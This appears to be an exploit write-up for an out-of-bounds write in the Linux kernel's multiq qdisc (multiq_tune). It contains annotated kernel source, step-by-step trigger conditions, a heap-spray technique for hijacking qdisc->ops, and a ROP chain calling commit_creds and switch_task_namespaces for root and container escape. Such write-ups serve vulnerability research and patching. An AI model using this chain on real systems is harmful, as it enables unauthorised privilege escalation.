### Triggering Vulnerability

This vulnerability is an OOB write vulnerability, where an arbitrary qdisc pointer can be used to overwrite the next object. An attacker could use this overwritten pointer to perform privilege escalation.

```c
static int multiq_tune(struct Qdisc *sch, struct nlattr *opt,
		       struct netlink_ext_ack *extack)
{
	struct multiq_sched_data *q = qdisc_priv(sch);
	struct tc_multiq_qopt *qopt;
	struct Qdisc **removed;
	int i, n_removed = 0;

	if (!netif_is_multiqueue(qdisc_dev(sch)))
		return -EOPNOTSUPP;
	if (nla_len(opt) < sizeof(*qopt))
		return -EINVAL;

	qopt = nla_data(opt);

	qopt->bands = qdisc_dev(sch)->real_num_tx_queues;

	removed = kmalloc(sizeof(*removed) * (q->max_bands - q->bands),     // [1]
			  GFP_KERNEL);
	if (!removed)
		return -ENOMEM;

	sch_tree_lock(sch);
	q->bands = qopt->bands;
	for (i = q->bands; i < q->max_bands; i++) {             // [2]
		if (q->queues[i] != &noop_qdisc) {
			struct Qdisc *child = q->queues[i];

			q->queues[i] = &noop_qdisc;
			qdisc_purge_queue(child);
			removed[n_removed++] = child;
		}
	}
    ...
}
```

When updating a qdisc in the `multiq_tune`, remove the child qdisc of the multiq qdisc if the value of `qopt->bands` is smaller than the value of `q->bands`. To do this, it use the `q->bands` to assign a `removed` [1]. Then update `q->bands` to `qopt->bands` and store the child qdisc to be removed in `removed` [2]. At this time, `removed` was allocated using `q->bands` and the `for` loop uses `qopt->bands`, so if `qopt->bands` is less than `q->bands`, an out-of-bounds write occurs.

To trigger vulenrability,

- Create veth device with numtxqueues 512.
- Change numtxqueues to 465 (a smaller number than before) to avoid a kernel panic during the exploit.
- Create multiq qdisc for veth device. The numtxqueue (465) is stored in `q->bands`.
- Change numtxqueues to 396 (a smaller number than before).
- Modify Qdisc. This results in the OOB write. `q->bands` and `qopt->bands` are `465` and `396`, respectively.

### KASLR Bypass

The kernel base address is obtained through a timing side-channel attack.

### RIP Control

We trigger the vulnerability to overwrite `qdisc->ops` with the child qdisc address. We then free the child qdisc and spray the payload to take control of the RIP.

```c
	qopt->bands = qdisc_dev(sch)->real_num_tx_queues;

	removed = kmalloc(sizeof(*removed) * (q->max_bands - q->bands),
			  GFP_KERNEL);
	if (!removed)
		return -ENOMEM;

	sch_tree_lock(sch);
	q->bands = qopt->bands;
	for (i = q->bands; i < q->max_bands; i++) {
		if (q->queues[i] != &noop_qdisc) {
			struct Qdisc *child = q->queues[i];

			q->queues[i] = &noop_qdisc;
			qdisc_purge_queue(child);
			removed[n_removed++] = child;                   // [3]
		}
	}

	sch_tree_unlock(sch);

	for (i = 0; i < n_removed; i++)
		qdisc_put(removed[i]);                              // [4]
	kfree(removed);

	for (i = 0; i < q->bands; i++) {
		if (q->queues[i] == &noop_qdisc) {
			struct Qdisc *child, *old;
			child = qdisc_create_dflt(sch->dev_queue,       // [5]
						  &pfifo_qdisc_ops,
						  TC_H_MAKE(sch->handle,
							    i + 1), extack);
			if (child) {
				sch_tree_lock(sch);
				old = q->queues[i];
				q->queues[i] = child;
				if (child != &noop_qdisc)
					qdisc_hash_add(child, true);

				if (old != &noop_qdisc)
					qdisc_purge_queue(old);
				sch_tree_unlock(sch);
				qdisc_put(old);
			}
		}
	}
```

When creating a multiq qdisc, new child qdisks are created in `kmalloc-512` [5]. Then, when `q->bands` is updated to 396, `removed` is allocated in `kmalloc-512` ((512-465)*8) and can be located before the previously allocated child qdisc. Due to the vulnerability, the child qdisc to be overwritten with `Qdisc *` in [3], causing `qdisc->ops` to overwrite it with the address of the child qdisc being removed. The overwritten qdisc is freed in [4], so the child qdisc's ops points to the freed address.

After the child qdisc is free, spray `ctl_buf` and `struct user_key_payload` into `kmalloc-512` to create a fake ops.

```c
static void __qdisc_destroy(struct Qdisc *qdisc)
{
	const struct Qdisc_ops  *ops = qdisc->ops;

#ifdef CONFIG_NET_SCHED
	qdisc_hash_del(qdisc);

	qdisc_put_stab(rtnl_dereference(qdisc->stab));
#endif
	gen_kill_estimator(&qdisc->rate_est);

	qdisc_reset(qdisc);                                                 // [6]

	if (ops->destroy)
		ops->destroy(qdisc);

	module_put(ops->owner);
	netdev_put(qdisc_dev(qdisc), &qdisc->dev_tracker);

	trace_qdisc_destroy(qdisc);

	call_rcu(&qdisc->rcu, qdisc_free_cb);
}
```

```c
void qdisc_reset(struct Qdisc *qdisc)
{
	const struct Qdisc_ops *ops = qdisc->ops;

	trace_qdisc_reset(qdisc);

	if (ops->reset)
		ops->reset(qdisc);                          // [7]

	__skb_queue_purge(&qdisc->gso_skb);
	__skb_queue_purge(&qdisc->skb_bad_txq);

	qdisc->q.qlen = 0;
	qdisc->qstats.backlog = 0;
}
```

Next, destroying the qdisc calls `__qdisc_destroy()`, which calls `qdisc_reset()` [6]. `qdisc_reset()` calls the `ops->reset()` by referencing the fake `qdisc->ops`. As a result, we can control the RIP to the desired value. In the exploit, the `mov_rsp_rbp_pop_rbp_ret` gadget is used to pivot the `rsp` register to the ROP payload.

### Post RIP

Store the ROP payload below to the `kmalloc-512`, and execute it.

```c
void make_payload(uint64_t* data){
    int i = 0;

    data[i++] = 0;

    data[i++] = kbase + pop_rdi_ret;
    data[i++] = 0;

    // commit_creds(&init_cred)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = kbase + init_cred_off;
    data[i++] = kbase + commit_creds_off;

    data[i++] = kbase + pppr;
    data[i++] = 0;
    data[i++] = 0;
    data[i++] = 0;                  // stack pivot gadget

    // find_task_by_vpid(1)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = 1;
    data[i++] = kbase + find_task_by_vpid_off;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + mov_rdi_rax_ret;
    data[i++] = 1;
    data[i++] = kbase + pop_rsi_ret;
    data[i++] = kbase + init_nsproxy_off;
    data[i++] = kbase + switch_task_namespaces_off;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + swapgs_restore_regs_and_return_to_usermode_off;
    data[i++] = 0;                  // rax
    data[i++] = 0;                  // rdx
    data[i++] = _user_rip;          // user_rip
    data[i++] = _user_cs;           // user_cs
    data[i++] = _user_rflags;       // user_rflags
    data[i++] = _user_sp;           // user_sp
    data[i++] = _user_ss;           // user_ss
}
```